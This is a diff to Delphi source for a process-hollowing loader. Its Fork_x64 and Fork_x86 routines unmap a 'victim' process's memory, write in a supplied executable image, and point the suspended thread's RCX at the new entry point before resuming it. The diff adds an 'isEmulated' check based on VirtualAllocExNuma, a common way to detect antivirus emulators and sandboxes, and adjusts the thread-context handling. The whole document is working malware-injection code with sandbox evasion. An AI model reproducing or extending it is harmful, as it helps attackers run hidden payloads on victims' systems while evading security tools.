@@ -39,8 +39,10 @@ uses Windows;
 type
   TByteArray = array of Byte;
 
-function VirtualAllocEx(hProcess: THandle; lpAddress: Pointer;
-  dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer;stdcall;external kernel32 name 'VirtualAllocEx';
+  function VirtualAllocEx(hProcess: THandle; lpAddress: Pointer;
+    dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer;stdcall;external kernel32 name 'VirtualAllocEx';
+
+   function isEmulated :boolean;
 
 {$IFDEF win64 }
 function Fork_x64(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;
@@ -54,6 +56,21 @@ function Fork_x86(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boo
 function NtUnmapViewOfSection(ProcessHandle: THandle; BaseAddress: Pointer): DWORD; stdcall; external 'ntdll.dll';
 
 implementation
+
+
+
+function isEmulated :boolean;
+var
+  mem : intptr;
+begin
+ mem := dword64(VirtualAllocExNuma(GetCurrentProcess(),0,$1000,$3000,$20,0));
+
+ if mem = 0 then
+ result := true
+ else
+  result := false
+
+end;
 
 procedure Move(Destination, Source: Pointer; dLength:DWORD);
 begin
@@ -137,7 +154,7 @@ var
   PI:         TProcessInformation;
   vSecurityAttributes: TSecurityAttributes;
   SI:         TStartUpInfo;
-  CONT:       PContext;
+  CONT,CONT_B:       PContext;
   ImageBase:  pointer;
  // lpimagebase : Dword64;
   Ret:        SIZE_T;
@@ -172,8 +189,8 @@ begin
 
         begin
 
-           CONT := PCONTEXT(VirtualAlloc(nil, sizeof(CONT), MEM_COMMIT, PAGE_READWRITE));
-          CONT.ContextFlags := CONTEXT_FULL;
+          CONT := PCONTEXT(VirtualAlloc(nil, sizeof(CONT), MEM_COMMIT, PAGE_READWRITE));
+          CONT.ContextFlags := CONTEXT_ALL;
 
           if GetThreadContext(PI.hThread, CONT^) then
           begin
@@ -211,10 +228,16 @@ begin
             end;
 
 
+                //setup another contex with different flags
+               CONT_B := PCONTEXT(VirtualAlloc(nil, sizeof(CONT), MEM_COMMIT, PAGE_READWRITE));
+               CONT_B.ContextFlags := CONTEXT_INTEGER;
+
+                // set thread context
+              CONT_B.RCX := dword64(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;
 
 
-            CONT.Rcx := Dword64(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;
-            SetThreadContext(PI.hThread, CONT^);
+
+            SetThreadContext(PI.hThread, CONT_B^);
             ResumeThread(PI.hThread);
 
             Result := TRUE;
